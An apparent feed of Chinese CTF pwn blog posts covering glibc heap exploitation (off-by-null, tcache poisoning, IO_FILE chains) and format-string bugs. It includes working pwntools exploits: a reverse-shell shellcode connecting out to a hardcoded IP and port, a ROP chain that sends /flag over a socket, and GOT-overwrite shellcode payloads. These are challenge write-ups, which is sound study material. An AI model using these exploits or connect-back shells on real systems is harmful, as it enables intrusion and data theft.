有无off-by-null 一般没有uaf都是会有off-by-null可以利用进行chunk overlapping 一起到unsorted bin中 没有off-by-null并且没有edit一般都是打tcache了，house of botcake,这时候打tcache poison主要是通过add时候的read进行 打tcache有时候会和fastbin联动，不能把思维局限在tcache，fastbin也有很大的用途 uaf和off-by-one/null都没有考虑idx负数溢出 还要考虑double free 是否进行orw 如果申请的chunk大小限制在0x30这种大小左右，很难布置IO链，这时候一般都是打栈溢出 如果申请的次数没有什么限制，就不需要打tcache_perthread，否则通过打tcache_perthread实现多次申请任意地址，任意地址申请受限制时总是容易忘记打这个结构 泄露栈地址也有两种方法，第一种时是把environ申请出来然后show，第二种是申请IO_2_1_stdout，然后通过stdout泄露出栈地址 参考博客 如果不进行libc2.31打hook即可，libc2.35打apple2这条链 还可以打栈溢出，如果只能largebin attack这种很难任意地址申请和泄露的，那么一般就打IO了。但如果明显可以任意地址申请和泄露，直接泄露栈地址无疑可以更快地进行orw，同时做题的时候发现libc2.31竟然不会对tcache是否是0x10对齐做检查!!! 如果进行，libc2.31利用 getkeyserv_handle+576 mov rdx, [rdi+8] mov [rsp+0C8h+var_C8], rax call qword ptr [rdx+20h] 发现libc2.31也有 svcudp_reply+26这个gadget,那其实也可以打house of apple2这条链了 .text:0000000000157BFA mov rbp, [rdi+48h] .text:0000000000157BFE mov rax, [rbp+18h] .text:0000000000157C02 lea r13, [rbp+10h] …</content></entry><entry><title>低版本off-by-null</title><url>/post/%E5%A0%86%E6%9D%82%E8%AE%B0/%E4%BD%8E%E7%89%88%E6%9C%ACoff-by-null/</url><categories><category>PWN</category><category>堆杂记</category></categories><tags><tag>低版本off-by-null</tag></tags><content type="html"><![CDATA[  off-by-null 利用思路 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法 溢出字节为 NULL字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清（1） 这时可以选择使用 unlink 方法进行处理，在unlink之前应当先free前面的堆块。（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致,而是通过next_chunk这个宏定义来进行检查因此可以利用。 因为事先free了两个堆块，这里假设为chunk0,chunk1 因此next_chunk(chunk0)显然等于chunk1 #define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p))) #define unlink(AV, P, BK, FD) { \ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \ malloc_printerr (&amp;#34;corrupted size vs. prev_size&amp;#34;);	\ FD = P-&amp;gt;fd;	\ BK = P-&amp;gt;bk;	\ if (__builtin_expect (FD-&amp;gt;bk != P || BK-&amp;gt;fd != P, 0))	\ malloc_printerr (&amp;#34;corrupted double-linked list&amp;#34;); ... } /* 下面的条件在unlink之前free的时候就已经满足 FD = P-&amp;gt;fd;	BK = P-&amp;gt;bk; */ 最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check
/* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size (p); size …  ]]></content></entry><entry><title>堆summary</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/%E5%A0%86summary/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>IO-FILE-summary</tag></tags><content type="html"> [TOC]
house系列 house系列的致命缺陷就是vtable是通过偏移调用函数 这种找vtable要根据源码去libc.so.6里面进行对比查找，同时也要根据已知版本的libc对应的附近去找 _IO_xxx_jumps集合
extern const struct _IO_jump_t _IO_file_jumps; libc_hidden_proto (_IO_file_jumps) extern const struct _IO_jump_t _IO_file_jumps_mmap attribute_hidden; extern const struct _IO_jump_t _IO_file_jumps_maybe_mmap attribute_hidden; extern const struct _IO_jump_t _IO_wfile_jumps; libc_hidden_proto (_IO_wfile_jumps) extern const struct _IO_jump_t _IO_wfile_jumps_mmap attribute_hidden; extern const struct _IO_jump_t _IO_wfile_jumps_maybe_mmap attribute_hidden; extern const struct _IO_jump_t _IO_old_file_jumps attribute_hidden; extern const struct _IO_jump_t _IO_streambuf_jumps; extern const struct _IO_jump_t _IO_old_proc_jumps attribute_hidden; extern const struct _IO_jump_t _IO_str_jumps attribute_hidden; extern const struct _IO_jump_t _IO_wstr_jumps attribute_hidden; house of pig IO_str_vtable = libc_base + 0x1ED560 _IO_str_jumps pwndbg&amp;amp;gt; p &amp;amp;amp;_IO_str_jumps $6 = (const …</content></entry><entry><title>堆tricks</title><url>/post/%E5%A0%86/%E5%A0%86tricks/</url><categories><category>PWN</category><category>堆入门</category></categories><tags><tag>堆入门</tag></tags><content type="html"><![CDATA[  [TOC] 1. 泄露libcbase，heapbase 2. 打free_hook或IO_FILE 保护机制 泄露heapbase 一般想要泄露heapbase的情况比较少见，都是想要修改tcache_perthread_struct才泄露。方法也很简单，有show函数直接让tcache结构变成：1-&amp;gt;0,那么show(1)然后再dbg一看算一下相对偏移就行了(或者直接heapbase = heap &amp;amp; 0xFFFFFFFFFFFFF000) 泄露libcbase 一般都是通过unsortedbin的特点来泄露libcbase，因此如何绕过题目限制得到一个unsortedbin chunk是核心问题。show出来的是main_arena附近，直接手动算个偏移就行了 largebin可以同时泄露libcbase和heapbase，但是要注意泄露后修复largebin 有时候也会遇到没有show函数的情况，此时可以打__IO_2_1_stdout 有时候会没有uaf，这样进入unsorted bin也不是很好泄露。但是可以利用chunk进入unsorted bin或者largebin会向其fd或者bk写入libc地址的特性，再add出来进行泄露就可以了 free_hook 可以看看这篇文章 tcache_perthread_struct 这个还是很好用的 有时候可以add的次数有限或者可以申请的chunk数量有限，所以不能直接用一个循环填满tcache，这时候可以通过修改tcache_perthread_struct中的counts数组，也可以达到填满tcache的效果 这个是libc2.30以下的tcache_perthread_struct结构，counts类型为char libc2.30及以上counts的类型变为unit16_t，总大小为0x10+2*0x40+8*0x40=0x10+0x80+0x200=0x290 很显然这个时候要泄露出heapbase mp_结构体 不能使用tcache -&amp;gt; 通过large_bin attack修改mp_.tcache_bins -&amp;gt; free相应chunk（满足tcache-&amp;gt;counts[tc_idx] &amp;gt; 0） -&amp;gt; 修改tcache的相应entries -&amp;gt; …  ]]></content></entry><entry><title>堆分配（自己复现）</title><url>/post/%E5%A0%86/%E5%A0%86%E5%88%86%E9%85%8D%E8%87%AA%E5%B7%B1%E5%A4%8D%E7%8E%B0/</url><categories><category>PWN</category><category>堆入门</category></categories><tags><tag>堆入门</tag></tags><content type="html"> [TOC] 一篇讲的比较清楚的博客 malloc函数 说明：first chunk是指bin中链表头部的chunk,last chunk是指bin中链表尾部的chunk。fastbin是LIFO，其他bin是FIFO
判断是否在fastbin大小范围内，如果在则根据malloc的size求出idx；如果fastbin[idx]不为空则取first chunk；如果为空，进入unsorted bins大循环 如果不在fastbin大小范围内，判断是否在smallbin大小范围内。如果在则根据malloc的size求出idx；如果smallbin[idx]不为空则取last chunk；如果为空,判断smallbin是否初始化。如果已经初始化，那么就进入unsorted bins大循环；如果没有初始化，调用malloc consolidate函数再进入unsorted bins大循环 如果既不在fastbin大小范围内，也不在smallbin大小范围内，判断有无fastchunks。如果没有，进入unsorted bins大循环；如果有，调用malloc consolidate函数再进入unsorted bins大循环 malloc consolidate函数 穷尽合并fastbin里面的chunk并放入unsorted bin中，与top chunk合并的chunk除外 遍历整个fastbinY(这是个指针数组,每个元素是一个单向链表的头部),只要整个fastbinY有chunk就遍历。先看prev inuse，如果为0,则unlink prev chunk；如果为1，看next chunk。如果next chunk为top chunk，那就和top chunk合并(和top合并后就直接遍历下一个fastchunk了);如果不是，看next inuse。如果为0，则unlink next chunk；为1就什么都不做。不管next inuse为0还是1，最终都将合并后的chunk插入unsorted bins中 一直遍历fastbinY直到fastbinY为空，进入unsorted bins大循环 unsorted bins大循环 遍历unsorted bin判断是否有满足条件的unsorted chunk，如果不满足条件就consolidate（将其放入合适的bin …</content></entry><entry><title>堆分配机制</title><url>/post/%E5%A0%86/%E5%A0%86%E5%88%86%E9%85%8D%E6%9C%BA%E5%88%B6/</url><categories><category>PWN</category><category>堆入门</category></categories><tags><tag>堆入门</tag></tags><content type="html"> [TOC] 一篇讲的很好的博客 概念明晰 bins的链表用的是头插法 fd和bk只在bins才有 在堆中prev chunk就是比它地址低的，next chunk就是比它地址高的 fd,bk指向的chunk的头而不是mem区域 fastbinsY和bins要区分开来 高版本的glibc，如果某个大小的tcache bin满了后再free这个大小的chunk，那么就会尝试进行unlink，如果没满那么是直接放入相应的tcache bin中的 malloc_consolidate和unsorted bin大循环不是绑在一起的，而是在malloc的过程中，大部分的malloc_consolidate后也会进行unsorted bin大循环 unsorted bin里面的chunk大小&amp;gt;想要分配的大小，并且在其他bin中都没有合适大小的chunk，那么一定会从unsorted bin进行切割分配 malloc的时候，不论malloc的大小，首先会去检查每个bins链是否有与malloc相等大小的freechunk。如果没有就去检查bins链中是否有大的freechunk可以切割（除去fastbins链），如果切割，那么就切割大的freechunk，那么切割之后的chunk成为last remainder，并且last remainder会被放入到unsortedbin中（这里往往可以泄露libcbase）。 这篇博客讲的很清楚</content></entry><entry><title>反弹shell</title><url>/post/pwn%E7%AC%94%E8%AE%B0/%E5%8F%8D%E5%BC%B9shell/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>反弹shell</tag></tags><content type="html"><![CDATA[  [TOC] 参考博客 关闭了标准输入、标准输出、标准错误时可以利用反弹shell
反弹shell connect()+dupsh() - 反连 实测这种最好用,这里的ip要填写自己的wsl的ip shellcode= asm(shellcraft.connect(&#39;172.18.211.41&#39;,4444,&#39;ipv4&#39;)+shellcraft.dupsh()) 此时连接成功会有如下 zp9080@LAPTOP-N2IL3LVK:~/PWN$ nc -lvp 4444 Listening on LAPTOP-N2IL3LVK 4444 Connection received on 172.18.211.41 60542 原理讲解 先创建套间字，然后connect,让server主动去connect我们监听的端口，建立socket连接。然后用dup2并用这个socket去覆盖原本的 0 1 2，达到将输出定向到远端的目的 bash的/dev/tcp/ip/port反弹shell 可以查看web pwn中bash反弹shell的笔记 通过创建socket套间字反弹shell 关闭了0,1,2要反弹shell connect参数为 &#34;&#34;&#34; s = socket(2, 1, 6) 这里返回的套间字应该是0 connect(s, &amp;addr, 0x10) open(/flag) 这里返回的文件描述符应该是1 read(/flag) read(1,bss,0x30) write(socket) 利用write向socket_fd写入东西 &#34;&#34;&#34; 例题 HZNUCTF maze 题目分析 可以看到要么满足magic的条件，这个次数很难实现。迷宫具体代码没有去逆向，但是发现每次基本一致，所以只要随便让P到达终点即可 发现1中my_read有个经典的off-by-one漏洞，那就可以partial overwrite，然后main返回时就可以执行2中的shellcode 但是发现从main中返回会关闭标准输入输出错误 做题过程 可以执行任意的shellcode，一开始一直以为可以open系统调用打开标准输入、输出，结果发现一直不行，后来才知道这里需要反弹shell 题解 这里用了反弹shell就可以得到flag了 from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;) p = process(&#34;/home/zp9080/PWN/maze&#34;) # p=remote(&#39;150.158.117.224&#39;,20036) # p=gdb.debug(&#34;/home/zp9080/PWN/maze&#34;,&#39;b *$rebase(0x1993)&#39;) elf = ELF(&#34;/home/zp9080/PWN/maze&#34;) def dbg(): gdb.attach(p,&#39;b *$rebase(0x1AE6)&#39;) p.sendlineafter(&#34;Choose an option: &#34;,str(2)) shellcode= asm(shellcraft.connect(&#39;172.18.211.41&#39;,4444,&#39;ipv4&#39;)+shellcraft.dupsh()) p.sendlineafter(&#34;say something to me:&#34;,shellcode) p.sendlineafter(&#34;Choose an option: &#34;,str(1)) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;a&#39;) p.sendline(&#39;a&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;a&#39;) p.sendline(&#39;a&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;a&#39;) p.sendline(&#39;a&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;a&#39;) p.sendline(&#39;a&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;w&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;d&#39;) p.sendline(&#39;s&#39;) p.sendline(&#39;s&#39;) call_ptr=0x1A8C payload=b&#39;a&#39;*0x28+b&#39;\x8c&#39; print(payload) p.send(payload) p.sendlineafter(&#34;Choose an option: &#34;,str(3)) p.interactive() VNCTF2022 BingDwenDwen from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 from pwnlib.util.packing import p16 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) # p = process(&#34;/home/zp9080/PWN/pwn&#34;) elf = ELF(&#34;/home/zp9080/PWN/pwn&#34;) libc=elf.libc def dbg(): gdb.attach(io,&#39;b *0x4013F9&#39;) pause() io=process(&#34;/home/zp9080/PWN/pwn&#34;) pop_rdi = 0x0000000000401356 pop_rsi = 0x0000000000401358 pop_rax = 0x000000000040135a pop_rcx = 0x000000000040135d pop_rdx = 0x0000000000401354 sys_ret = 0x0000000000401351 bss_addr = 0x403700 push_rax_pop_rcx = 0x000000000040135c mov_rdi_rcx = 0x000000000040135f &#34;&#34;&#34; s = socket(2, 1, 6) connect(s, &amp;addr, 0x10) open(/flag) read(/flag) write(socket) &#34;&#34;&#34; dbg() payload = flat({ 0x1d0: [ # socket p16(0x2), # AF_INET p16(4444,endian=&#34;big&#34;), # PORT p32(0xac12d329, endian=&#34;big&#34;), #修改为公网IP 172.18.211.41 p64(0), # padding &#34;/flag&#34;.ljust(8, &#34;\x00&#34;) ], 0x10: [ pop_rdi, 2, pop_rsi, 1, pop_rdx, 6, pop_rax, 0x29, sys_ret, # socket(2, 1, 6) #题中专门给的gadget push_rax_pop_rcx, mov_rdi_rcx, pop_rsi, bss_addr+0x1d0, pop_rdx, 0x10, pop_rax, 0x2a, sys_ret, # connect(s, &amp;addr, 0x10) pop_rdi, bss_addr+0x1e0, pop_rsi, 0, pop_rax, 2, # open sys_ret, push_rax_pop_rcx, mov_rdi_rcx, pop_rsi, bss_addr+0x200, pop_rdx, 0x30, # read pop_rax, 0, sys_ret, pop_rdi, 0, pop_rsi, bss_addr+0x200, pop_rdx, 0x30, pop_rax, 1, # write sys_ret ] }) io.sendlineafter(&#34;Hello,Do You Like Bing Dwen Dwen?\n&#34;, payload) io.interactive()   ]]></content></entry><entry><title>非常见类型的格式化字符串</title><url>/post/format-string/%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url><categories><category>PWN</category><category>Format-String</category></categories><tags><tag>非常见类型的格式化字符串</tag></tags><content type="html"><![CDATA[  scanf的格式化字符串 做了这么久的格式化字符串，第一次见scanf的格式化字符串，于是做个记录 题目分析 可以看到把read读入的作为scanf的第一个参数，同时要注意一个细节，此时rsi也是指向buf（但是后来发现这个没用。。。） 这个题卡了很久只要是因为网上关于scanf的文章很少，而且也不是漏洞分析，大多是C语言，最后类比printf函数做出来了 exp from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) # p=process(&#34;/home/zp9080/PWN/vuln&#34;) p=remote(&#39;10.128.140.23&#39;,54821) elf=ELF(&#39;/home/zp9080/PWN/vuln&#39;) libc=elf.libc def dbg(): gdb.attach(p,&#39;b *0x40127C&#39;) pause() # dbg() backdoor=0x4012C2 p.recvuntil(&#34;Welcome to xyctf, this is a gift: &#34;) libcbase=int(p.recv(14), 16)-libc.sym[&#39;printf&#39;] print(hex(libcbase)) libcgot=libcbase+0x1EC040 payload=b&#39;%*s%8$lln&#39; payload=payload.ljust(0x10,b&#39;a&#39;)+p64(libcgot) p.send(payload) payload=b&#39;a&#39;*backdoor p.sendline(payload) p.interactive() exp分析 这个题上来就给了libc，但是elf文件是full rel，所以想到打libc.got，起初打strlen.got但是好像没有，最后调试的时候跟进printf函数随便找了个要用到got的 因为b&rsquo;a&rsquo;* backdoor输入很多，因此要用%*s不然会爆栈 在scanf函数中%n和printf函数是很类似的，只不过把成功读入的字符串写入对应的指针所指向的地方，于是有了此解法 DASCTF2024 八月挑战赛 clock 在init函数中让堆可执行 char *init() { char *buf; // [rsp+8h] [rbp-8h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); buf = (char *)malloc(0x100uLL); mprotect(buf - 672, 0x21000uLL, 7); puts(&#34;plz input mprotect code&#34;); read(0, buf, 0x10uLL); return buf; } 其他函数都没有什么漏洞，只在display_current_time函数中有个格式化字符串漏洞 int display_current_time() { int v0; // r8d int v1; // r9d char *v2; // rax char pwd[48]; // [rsp+0h] [rbp-70h] BYREF char buf[48]; // [rsp+30h] [rbp-40h] BYREF time_t timer; // [rsp+60h] [rbp-10h] BYREF void *name; // [rsp+68h] [rbp-8h] timer = time(0LL); name = malloc(0x100uLL); printf(&#34;You should login first,plz input format:&#34;); read(0, buf, 0x30uLL); printf(&#34;input name:&#34;); read(0, name, 0x100uLL); printf(&#34;input pwd:&#34;); read(0, pwd, 0x30uLL); format_and_print((unsigned int)buf, (_DWORD)name, (unsigned int)pwd, (_DWORD)name, v0, v1, pwd[0]); puts(&#34;/bin/sh&#34;); v2 = ctime(&amp;timer); return printf(&#34;Current time is %s&#34;, v2); } got表可写，同时格式化字符串后有个puts函数，想到劫持puts的got为shellcode地址。 但是遇到一个问题，和平常printf不一致的是，vsnprintf并不能泄漏堆地址和栈地址出来，他会将数据存到buffer中。
这里就要用一个小trick，利用%*d进行格式化字符串，具体内容如下 那这里就可以相当于printf(&quot;%*d%63$ln&quot;,name,pwd); 那么name的值就被当作width补充space，进而利用$n讲puts_got改写为堆地址，进行执行shellcode
exp from pwnlib.util.packing import u64 from pwnlib.util.packing import u32 from pwnlib.util.packing import u16 from pwnlib.util.packing import u8 from pwnlib.util.packing import p64 from pwnlib.util.packing import p32 from pwnlib.util.packing import p16 from pwnlib.util.packing import p8 from pwn import * from ctypes import * context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) p = process(&#34;/home/zp9080/PWN/pwn&#34;) # p=gdb.debug(&#34;/home/zp9080/PWN/pwn&#34;,&#39;b *0x4013D2&#39;) # p=remote(&#39;8.147.134.27&#39;,36901) # p=process([&#39;seccomp-tools&#39;,&#39;dump&#39;,&#39;/home/zp9080/PWN/pwn&#39;]) elf = ELF(&#34;/home/zp9080/PWN/pwn&#34;) libc=elf.libc def dbg(): gdb.attach(p,&#39;b *0x04013E5&#39;) pause() p.recvuntil(b&#34;plz input mprotect code&#34;) p.sendline(b&#34;a&#34;) p.recvuntil(b&#34;Enter your choice:&#34;) p.sendline(b&#34;3&#34;) p.recvuntil(b&#34;You should login first,plz input format:&#34;) #puts_got payload1 = b&#34;%4210688x%33$ln&#34; p.sendline(payload1) p.recvuntil(b&#34;input name:&#34;) p.sendline(b&#34;name&#34;) p.recvuntil(b&#34;input pwd:&#34;) p.sendline(b&#34;pwd&#34;) # dbg() p.recvuntil(b&#34;Enter your choice:&#34;) p.sendline(b&#34;3&#34;) p.recvuntil(b&#34;You should login first,plz input format:&#34;) payload2 = b&#34;%*d%63$ln&#34; p.sendline(payload2) shellcode = asm(shellcraft.sh()) p.recvuntil(b&#34;input name:&#34;) p.sendline(shellcode) p.recvuntil(b&#34;input pwd:&#34;) p.sendline(b&#34;pwd&#34;) p.interactive()   ]]></content></entry><entry><title>非栈上格式化字符串</title><url>/post/format-string/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url><categories><category>PWN</category><category>Format-String</category></categories><tags><tag>非栈上格式化字符串</tag></tags><content type="html"><![CDATA[  （非栈上格式化字符串）往retaddr写一个orw，这种一般都要有无限次写才行,同时要找到栈上一个链才行 要注意链写的时候不要被覆盖，%{0}c会写入1，如果想写入0前面什么都没有就行（自己dbg试出来的） 注意read,write函数的rsi,rdx都要重新赋值，因为dbg的时候发现它们的值改变了 有时候flag字符串不太对（比如可能是flags），需要自己写入flag字符串即可 有时候为了节省次数写入0可用%ln 注意有时候写到bss段上残留有上次的数据，因此用payload=payload.ljust(0x50,&lsquo;a&rsquo;)清除残留 其实也可以再read一次来orw 有时候程序只有一次格式化字符串，可以覆盖printf自身的返回地址，无限进行格式化字符串
def write(ret,func,c=-1): if(c&gt;=0): #最低2字节 if(c==0): payload=f&#34;%{ret&amp;0xffff}c%26$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) payload=f&#34;%73$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) if(c&gt;0): payload=f&#34;%{ret&amp;0xffff}c%26$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) payload=f&#34;%{c}c%73$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) #中间2字节 payload=f&#34;%{(ret+2)&amp;0xffff}c%26$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) payload=f&#34;%73$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) #高2字节 payload=f&#34;%{(ret+4)&amp;0xffff}c%26$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) payload=f&#34;%73$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) #最高2字节 payload=f&#34;%{(ret+6)&amp;0xffff}c%26$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) payload=f&#34;%73$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) return #低2字节 payload=f&#34;%{ret&amp;0xffff}c%26$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) payload=f&#34;%{func&amp;0xffff}c%73$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) #中间2字节 func=func&gt;&gt;16 payload=f&#34;%{(ret+2)&amp;0xffff}c%26$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) payload=f&#34;%{func&amp;0xffff}c%73$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) #高2字节 func=func&gt;&gt;16 payload=f&#34;%{(ret+4)&amp;0xffff}c%26$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) payload=f&#34;%{func&amp;0xffff}c%73$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) #如果最高2字节也需要覆盖自己手动添加 payload=f&#34;%{(ret+6)&amp;0xffff}c%26$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) payload=f&#34;%73$hn&#34; payload=payload.ljust(0x50,&#39;a&#39;) p.sendline(payload) pop_rdi=libcbase+0x2a3e5 pop_rsi=libcbase+0x2be51 pop_rdx=libcbase+0x796a2 open_addr=libcbase+libc.sym[&#39;open&#39;] read_addr = libcbase + libc.sym[&#39;read&#39;] write_addr=libcbase+libc.sym[&#39;write&#39;] flag=libcbase + next(libc.search(b&#39;flag&#39;)) payload=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(open_addr) payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack)+p64(pop_rdx)+p64(0x50)+p64(read_addr) payload+=p64(pop_rdi)+p64(1)+p64(write_addr) #open write(ret,pop_rdi) write(ret+8,flag) write(ret+8*2,pop_rsi) write(ret+8*3,0,0) write(ret+8*4,open_addr) #read write(ret+8*5,pop_rdi) write(ret+8*6,3,3) write(ret+8*7,pop_rsi) write(ret+8*8,stack) write(ret+8*9,pop_rdx) write(ret+8*10,0x50,0x50) write(ret+8*11,read_addr) #write write(ret+8*12,pop_rdi) write(ret+8*13,1,1) write(ret+8*14,pop_rsi) write(ret+8*15,stack) write(ret+8*16,pop_rdx) write(ret+8*17,0x50,0x50) write(ret+8*18,write_addr)   ]]></content></entry><entry><title>浮点数</title><url>/post/pwn%E7%AC%94%E8%AE%B0/%E6%B5%AE%E7%82%B9%E6%95%B0/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn</tag></tags><content type="html"> 用float-toy可以很方便的构造浮点数</content></entry><entry><title>高版本off-by-null</title><url>/post/%E5%A0%86%E6%9D%82%E8%AE%B0/%E9%AB%98%E7%89%88%E6%9C%ACoff-by-null/</url><categories><category>PWN</category><category>堆杂记</category></categories><tags><tag>高版本off-by-null</tag></tags><content type="html"><![CDATA[  [TOC]
思路分析 贴一个 参考博客 多了几个步骤： 一个伪造fake chunk的过程 伪造了size还得满足__builtin_expect (fd-&amp;gt;bk != p || bk-&amp;gt;fd != p, 0)这个条件判断，这里主要是通过chunk进入bin的时候的入链操作来实现的 *(_BYTE )(((_QWORD *)&amp;amp;chunklist + i) + (int)read(0, *((void **)&amp;amp;chunklist + i), size)) = 0;注意第二步修复fd,bk时还要注意这个有个\x00截断，因此堆风水很重要，这个chunk的最低字节要为\x00 chunk overlapping后可以切割unsorted bin中的overlapping chunk，直接add一个超大的chunk进行read（read之后记得delete），因为overlapping chunk存在一些chunk是没有被free掉的，那么这些就有大用途，可以打tcache poison也可以打largebin attack，取决于这个overlapping chunk里面有多少没有被free的chunk，自己也可以在overlapping之前多放几个进去，但可能要注意修改一些size和prevsize 要泄露heapbase的情况下，部分ck3需要申请出来uaf，同时这里没有直接对unsorted bin来add一个超大的chunk进行越界edit，而是通过修改在chunklist中存在的chunk（没有被free的chunk）的size来实现越界edit的效果 利用解析 从C0开始到D的chunk被合并为一个chunk，中间有很多可以利用的
libc2.31、申请时有idx、不泄露heapbase 如果要用orw,可以考虑泄露栈地址，libc2.31的tcache不会对0x10字节对齐做检查 如果需要多次tcache poison，可以在3和5之间多加几个chunk用来tcache poison 可以看到这里的部分ck3（也就是C1）是没有add出来再用的 # ============================================= # step1 P&amp;amp;0xff = 0 add(0,0x418, …  ]]></content></entry><entry><title>高版本打tcache</title><url>/post/%E5%A0%86%E6%9D%82%E8%AE%B0/%E9%AB%98%E7%89%88%E6%9C%AC%E6%89%93tcache/</url><categories><category>PWN</category><category>堆杂记</category></categories><tags><tag>高版本打tcache</tag></tags><content type="html"><![CDATA[  [TOC]
前言 在此之前，笔者libc2.35都固化思维地只会largebin attack然后打IO，一遇到高版本还打tcache的好像束手无策 但是largebin attack的目的其实就是任意地址写堆地址，但是如果能做到tcache poison实现任意地址分配，这种攻击的威力更大 例题分析 例题 NSSROUND21 want_girlfriend 题目中有可以直接修改tcache堆块的key的操作，因此tcache double free很容易实现
